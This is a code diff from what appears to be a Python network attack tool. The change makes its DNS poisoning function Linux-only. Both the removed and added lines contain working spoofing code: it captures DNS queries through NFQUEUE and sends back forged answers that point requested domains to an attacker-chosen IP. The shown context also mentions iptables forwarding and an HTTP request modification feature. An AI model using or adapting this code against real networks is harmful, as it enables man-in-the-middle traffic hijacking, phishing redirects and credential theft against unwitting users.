@@ -10,7 +10,6 @@ import os
 import platform
 import ctypes
 import subprocess
-from netfilterqueue import NetfilterQueue
 from flask import Flask, render_template_string, request, redirect
 
 # Check platform and privileges
@@ -105,19 +104,25 @@ class Device:
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ip):
-        def dns_pkt_callback(pkt):
-            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
-                send(spoofed_pkt, iface=self.iface, verbose=False)
-                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
-        
-        nfqueue = NetfilterQueue()
-        nfqueue.bind(0, dns_pkt_callback)
-        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
-        nfqueue.run()
+        if platform.system() == "Linux":
+            # Only import NetfilterQueue for Linux
+            from netfilterqueue import NetfilterQueue
+
+            def dns_pkt_callback(pkt):
+                if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
+                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
+                    send(spoofed_pkt, iface=self.iface, verbose=False)
+                    print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
+
+            nfqueue = NetfilterQueue()
+            nfqueue.bind(0, dns_pkt_callback)
+            print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
+            nfqueue.run()
+        else:
+            print(f"{Fore.RED}DNS Poisoning is not supported on this OS.{Style.RESET_ALL}")
 
     def http_request_modification(self):
         app = Flask(__name__)
